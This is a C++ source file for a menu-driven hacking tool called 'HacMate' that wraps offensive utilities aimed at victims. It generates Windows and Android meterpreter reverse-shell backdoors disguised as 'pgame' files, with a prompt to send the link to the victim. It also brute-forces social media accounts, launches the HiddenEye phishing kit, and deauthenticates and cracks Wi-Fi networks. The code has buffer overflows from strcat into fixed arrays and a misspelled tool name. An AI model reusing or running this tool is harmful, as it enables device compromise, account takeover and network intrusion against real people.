#include <iostream>
#include <stdlib.h>
#include <string.h>
#include <math.h>

void Net_Scanning();
void Phishing();
void Wifi_Hacking();
void Pass_Cracking();
void BackDoor();
void Choice();
void Custom_Password_List();

using namespace std;

void Custom_Password_List() {
  char ch;
  cout<<"\n\n\n\t\t\x1B[34m* Do you want to install required tool (for new user) [Y/N]*\033[0m\t\t\n\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
  if(ch == 'Y' || ch == 'y')
  system("git clone https://github.com/Mebus/cupp.git");
  system("cd cupp;python3 cupp.py -i");
}

void BackDoor() {
  char ch;
  int key;
  while(key!=10) {
    cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
    cout<<"      1. Access Windows (BackDoor Access)\n";
    cout<<"      2. Access Android (BackDoor Access)\n";
    cout<<"      10. Go Back\n";
    cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
    cin>>key;
    char ip[16];
    switch (key) {
      case 1: {
        char gen_cmd[] = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=";
        cout<<"\n\n\n\t\t\x1B[34m* Enter your ip address (ifconfig) *\033[0m\t\t\n\n";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        strcat(gen_cmd,ip);
        cout<<gen_cmd<<endl;
        cout<<ip<<endl;
        char temp[] = " LPORT=4444 -a x86 -f exe > /var/www/html/pgame.exe";
        strcat(gen_cmd,temp);
        cout<<gen_cmd<<endl;
        cout<<ip<<endl;
        system(gen_cmd);
        system("service apache2 start");
        cout<<"\n\n\n\t\x1B[34m Send this Link to the Victim : \033[0m\t";
        cout<<"http://"<<ip<<"/pgame.exe";
        cout<<"\n\n\n\n\nEnter any Alpha Key if done : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
        cout<<"Use the following command in msf5> console : "<<"\n\n"<<"\tuse exploit/multi/handler\n\n\tset Payload windows/meterpreter/reverse_tcp\n\n\tset LHOST "<<ip<<"\n\n\texploit\n\n\n";
        system("msfconsole");
        system("rm /var/www/html/pgame.exe");
        break;
      }
      case 2: {
        char gen_cmd[] = "msfvenom -p android/meterpreter/reverse_tcp LHOST=";
        cout<<"\n\n\n\t\t\x1B[34m* Enter your ip address (ifconfig) *\033[0m\t\t\n\n";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        strcat(gen_cmd,ip);
        cout<<gen_cmd<<endl;
        cout<<ip<<endl;
        char temp[] = " LPORT=4444 R > /var/www/html/pgame.apk";
        strcat(gen_cmd,temp);
        cout<<gen_cmd<<endl;
        cout<<ip<<endl;
        system(gen_cmd);
        system("service apache2 start");
        cout<<"\n\n\n\t\x1B[34m Send this Link to the Victim : \033[0m\t";
        cout<<"http://"<<ip<<"/pgame.apk";
        cout<<"\n\n\n\n\nEnter any Alpha Key if done : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
        cout<<"Use the following command in msf5> console : "<<"\n\n"<<"\tuse exploit/multi/handler\n\n\tset Payload android/meterpreter/reverse_tcp\n\n\tset LHOST "<<ip<<"\n\n\texploit\n\n\n";
        system("msfconsole");
        system("rm /var/www/html/pgame.apk");
        break;
      }
      case 10: {

        break;
      }
      default : cout<<"\n Enter a Valid Key ";
    }
  }
}

void Pass_Cracking() {

  char ch;
  int key;

  while(key!=10) {

    cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
    cout<<"      1. Facebook Password Cracking (BruteForcing)\n";
    cout<<"      2. Instagram Password Cracking (BruteForcing)\n";
    cout<<"      3. Twitter Password Cracking (BruteForcing)\n";
    cout<<"      10. Go Back\n";
    cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
    cin>>key;
    char username[30];
    char pass_list[50];

    switch(key) {
      case 1: {
        char cmd[] = "cd;brut3k1t -s facebook -u ";
        cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
        cin>>username;
        cout<<"\n\n\n\x1B[34m* Enter the Path of Passwords List (wordlist)  {referring from root in .txt format} *\033[0m\t\t\n\n";
        cin>>pass_list;
        strcat(cmd,username);
        strcat(cmd," -w ");
        strcat(cmd,pass_list);
        system(cmd);
      }
      break;
      case 2: {
        char cmd[] = "cd;brut3k1t -s instagram -u ";
        cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
        cin>>username;
        cout<<"\n\n\n\x1B[34m* Enter the Path of Passwords List (wordlist)  {referring from root in .txt format} *\033[0m\t\t\n\n";
        cin>>pass_list;
        strcat(cmd,username);
        strcat(cmd," -w ");
        strcat(cmd,pass_list);
        system(cmd);
      }
      break;
      case 3: {
        char cmd[] = "cd;brut3k1t -s twitter -u ";
        cout<<"\n\n\n\t\t\x1B[34m* Enter the UserName of Victim *\033[0m\t\t\n\n";
        cin>>username;
        cout<<"\n\n\n\x1B[34m* Enter the Path of Passwords List (wordlist)  {referring from root in .txt format} *\033[0m\t\t\n\n";
        cin>>pass_list;
        strcat(cmd,username);
        strcat(cmd," -w ");
        strcat(cmd,pass_list);
        system(cmd);
      }
      break;
      case 10: return;
      break;
      default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
    }
  }
}

void Wifi_Hacking() {
  char ch;
  char wlan_name[10];
  cout<<"\n\n\n\t\t\x1B[34m* Enter Your Wireless Card id *\033[0m\t\t\n\n";
  cout<<"\t [  You can find it by running ifconfig command in new terminal (Ex-wlan0, wlan1)  ]\n\n\n\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>wlan_name;
  char wlanmon[15];

  strcpy(wlanmon,wlan_name);
  strcat(wlanmon,"mon");
  char start[] = "airmon-ng start ";
  strcat(start,wlan_name);
  system(start);
  system("airmon-ng check kill");
  strcpy(start,"airodump-ng ");
  strcat(start,wlanmon);

  cout<<"\n\n\n\t\t [ Now you have to note down the MAC Address and CH no.(channel no.) of the target ]\n\n\t\t\t NOTE : Target should appear on both the interfaces \n\t\t\t i.e., atleast one device should be connected with the target. \n\n \tYou should enter ctrl+c if note is done\n\n\n \t ENTER ANY ALPHA KEY IF YOU ARE READY\n\n\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
  system(start);
  char mac_add[20];
  char channel_no[5];

  cout<<"\n\n\n\t\t\x1B[34m* Enter the victim's MAC Address *\033[0m\t\t\n\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>mac_add;

  cout<<"\n\n\n\t\t\x1B[34m* Enter the victim's Channel Number (CH no.)  *\033[0m\t\t\n\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>channel_no;

  cout<<"\n\n \t\t [ Enter the following command in NEW TERMINAL (in same directory) ] \n\n  \t\t\t\t airodump-ng -c <CH NO.> -w -b <MAC ADDRESS> wlan0mon\n\n\n \t ENTER ANY ALPHA KEY IF YOU ARE READY\n\n\n";

  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
  char long_cmd[] = "airplay-ng -0 0 -a ";
  strcat(long_cmd,mac_add);
  strcat(long_cmd," ");
  strcat(long_cmd,wlanmon);
  system(long_cmd);
  cout<<"\n\n Enter any ALPHA key if HandShake is done in new TERMINAL";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
  system("aircrack-ng -w rockyou.txt aircrack-01.cap");
  strcpy(long_cmd,"airmon-ng stop ");
  strcat(long_cmd,wlanmon);
  system(long_cmd);
  system("rm aircrack-01.cap;rm aircrack-01.csv;rm aircrack-01.kismet.netxml;rm aircrack-01.kismet.csv");
  cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
}


void Phishing() {
  char ch;
  int key;
  cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
  cout<<"      1. Open HiddenEye\n";
  cout<<"      2. Install HiddenEye(For new users) and open\n";
  cout<<"      10. Go Back\n";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>key;
  while(key!=10) {
    switch(key) {
      case 1: system("cd HiddenEye;python3 HiddenEye.py");
      break;
      case 2: system("apt-get install git -y;git clone https://github.com/DarkSecDevelopers/HiddenEye.git;cd HiddenEye;pip install -r requirements.txt;pip3 install wget;python3 HiddenEye.py");
      break;
      case 10: return;
      break;
      default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
    }
  }
  cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
  cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
  cin>>ch;
}


void Net_Scanning() {

  char ip[30];
  char ch;
  int key;
  while (key!=10) {

    cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
    cout<<"      1. Find Live Hosts on Network\n";
    cout<<"      2. Find and Ping all Live Hosts on Network\n";
    cout<<"      3. Find Open Ports on Host\n";
    cout<<"      4. Find Services Listening on Ports on Hosts\n";
    cout<<"      5. Check for Vulnerabilities on Hosts\n";
    cout<<"      6. Aggressive Scan\n\n\n";
    cout<<"      10. Go Back to Main Menu";
    cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
    cin>>key;


    switch (key) {
      case 1: {

        cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m";
        cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        char st[] = "nmap -sL ";
        strcat(st,ip);
        cout<<" Entered Command <"<<st<<">";
        system(st);
        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 2: {
        cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
        cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        char st[] = "nmap -sn ";
        strcat(st,ip);
        cout<<" Entered Command <"<<st<<">";
        system(st);
        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 3: {
        cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
        cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        char st[] = "nmap ";
        strcat(st,ip);
        cout<<" Entered Command <"<<st<<">";
        system(st);
        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 4: {

        cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
        cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        char st[] = "nmap -sV ";
        strcat(st,ip);
        cout<<" Entered Command <"<<st<<">";
        system(st);
        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 5: {
        system("locate .nse | grep ftp");

        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 6: {
        cout<<"\n\t\t\x1B[36mEnter the ip to Scan :\033[0m ";
        cout<<"\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ip;
        char st[] = "nmap -A ";
        strcat(st,ip);
        cout<<" Entered Command <"<<st<<">";
        system(st);
        cout<<"\n\n\n\n\nEnter any Alpha Key to go back : ";
        cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
        cin>>ch;
      }
      break;
      case 10: return;
      break;
      default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
    }
  }
}


int main()        //main function
{
  system("clear");
  Choice();       //calling chioce function

  system("clear");

  return 0;
}


void Choice() {
  system("clear");
  int key;
  while(key != 10) {
    cout<<"\n\n";
    cout<<"              HHH   HHH    MMM       MMM\n             HHH   HHH    MMMM     MMMM\n            HHHHHHHHH    MMM MM MM MMM\n           HHHHHHHHH    MMM  MMM  MMM\n          HHH   HHH    MMM   M   MMM\n         HHH   HHH    MMM       MMM";
    cout<<"\n\n\n\x1B[34m*************  Please Enter Your Choice  *************\033[0m\t\t\n\n\n\n";
    cout<<"     1. Network Scanning\n";
    cout<<"     2. Phishing Attack\n";
    cout<<"     3. Wifi Hacking\n";
    cout<<"     4. Password Cracking\n";
    cout<<"     5. Backdoor Access\n";
    cout<<"     6. Custom Password List\n";
    cout<<"\n\n     10. \x1B[91m\"\033[0mExit\x1B[91m\"\033[0m\t\t";
    cout<<"\n\n\n\n\x1B[93mHacMate[~]->\033[0m";
    cin>>key;
      switch(key){
        case 1: Net_Scanning();
                break;
        case 2:
                Phishing();
                break;
        case 3:
                Wifi_Hacking();
                break;
        case 4:
                Pass_Cracking();
                break;
        case 5:
                BackDoor();
                break;
        case 6:
                Custom_Password_List();
                break;
        case 10: exit(0);
                break;
        default : cout<<"\x1B[91mInvalid Key Entered\033[0m";
      }
  }

}
